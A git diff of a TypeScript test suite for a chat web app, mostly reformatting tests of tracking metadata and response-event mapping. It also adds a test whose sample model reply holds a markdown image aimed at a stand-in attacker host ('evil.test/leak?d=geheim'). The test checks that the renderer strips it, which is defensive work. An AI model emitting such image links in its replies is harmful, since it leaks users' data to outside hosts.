@@ -1,6 +1,9 @@
 import { create, type MessageInitShape } from "@bufbuild/protobuf";
+import { createElement } from "react";
+import { renderToStaticMarkup } from "react-dom/server";
 
 type EventInit = MessageInitShape<typeof ResponseEventSchema>["event"];
+
 import { describe, expect, it } from "vitest";
 import {
   AssistantPhase,
@@ -9,13 +12,13 @@ import {
   ResponseEventSchema,
   ResponseSchema,
   ResponseStatus,
-  type ResponseEvent,
 } from "../src/server/gen/agent/conversations/v1/conversations_pb";
 import { clientIp } from "../src/server/guard/client-ip";
 import { InflightRegistry, RateLimiter } from "../src/server/guard/rate-limit";
 import { issueToken, verifyToken } from "../src/server/guard/token";
 import { mergeTrackingMetadata } from "../src/server/metadata";
 import { ResponseEventMapper } from "../src/server/runtime/events";
+import { Message } from "../src/web/components/Message";
 import { parseMessage } from "../src/web/lib/markup";
 import { buildGa4Event, mergeIncomingTracking } from "../src/web/lib/tracking";
 import { texts } from "./fixtures";
@@ -101,7 +104,13 @@ describe("mergeTrackingMetadata", () => {
     const first = mergeTrackingMetadata({ channel: "webchat" }, { location: "https://a/1", journeyId: "j1" });
     expect(first).toEqual({ channel: "webchat", entry_page: "https://a/1", origin_info: "https://a/1", journey_id: "j1" });
     const second = mergeTrackingMetadata(first!, { location: "https://a/2", journeyId: "j2", userPseudoId: "u1" });
-    expect(second).toEqual({ channel: "webchat", entry_page: "https://a/1", origin_info: "https://a/2", journey_id: "j1", user_pseudo_id: "u1" });
+    expect(second).toEqual({
+      channel: "webchat",
+      entry_page: "https://a/1",
+      origin_info: "https://a/2",
+      journey_id: "j1",
+      user_pseudo_id: "u1",
+    });
   });
   it("meldet keine Änderung, wenn alles gleich ist", () => {
     const current = { channel: "webchat", entry_page: "https://a/1", origin_info: "https://a/1" };
@@ -120,10 +129,17 @@ describe("ResponseEventMapper", () => {
   const message = (id: string, phase: AssistantPhase, text = "") =>
     create(ItemSchema, {
       id,
-      item: { case: "message", value: { role: MessageRole.ASSISTANT, phase, content: text ? [{ part: { case: "text", value: text } }] : [] } },
+      item: {
+        case: "message",
+        value: { role: MessageRole.ASSISTANT, phase, content: text ? [{ part: { case: "text", value: text } }] : [] },
+      },
     });
   const finished = (status: ResponseStatus, error?: { code: string; retryable: boolean }) =>
-    create(ResponseSchema, { id: "resp_1", status, error: error ? { code: error.code, message: "", retryable: error.retryable } : undefined });
+    create(ResponseSchema, {
+      id: "resp_1",
+      status,
+      error: error ? { code: error.code, message: "", retryable: error.retryable } : undefined,
+    });
 
   it("liefert started, nur sichtbare Deltas und done", () => {
     const mapper = new ResponseEventMapper(texts);
@@ -168,7 +184,9 @@ describe("ResponseEventMapper", () => {
 
   it("macht aus FAILED einen Fehler mit retryable der Runtime", () => {
     const mapper = new ResponseEventMapper(texts);
-    const [out] = mapper.map(ev(9, { case: "finished", value: finished(ResponseStatus.FAILED, { code: "provider_unavailable", retryable: true }) }));
+    const [out] = mapper.map(
+      ev(9, { case: "finished", value: finished(ResponseStatus.FAILED, { code: "provider_unavailable", retryable: true }) }),
+    );
     expect(out).toEqual({ event: "error", data: { code: "generation_failed", message: texts.errors.generic, retryable: true }, id: "9" });
     expect(mapper.finished).toMatchObject({ status: "FAILED", errorCode: "provider_unavailable" });
   });
@@ -195,5 +213,28 @@ describe("Tracking der Elternseite", () => {
       fieldValue3: "j1",
     });
     expect(buildGa4Event({ step: "link_click", linkUrl: "https://x" }, {})).toMatchObject({ fieldValue1: "https://x", fieldValue3: "n/a" });
+  });
+});
+
+describe("Message", () => {
+  it("stellt Bilder aus Modellantworten nicht dar", () => {
+    const html = renderToStaticMarkup(
+      createElement(Message, {
+        message: {
+          key: "m1",
+          role: "assistant",
+          text: "Hier: ![x](https://evil.test/leak?d=geheim) und [Link](https://www.hanse-haus.de/)",
+        },
+        avatarUrl: null,
+        typingLabel: "",
+        referrerHosts: [],
+        buttonsActive: false,
+        onButton: () => {},
+        onLinkClick: () => {},
+      }),
+    );
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("evil.test");
+    expect(html).toContain('href="https://www.hanse-haus.de/"');
   });
 });
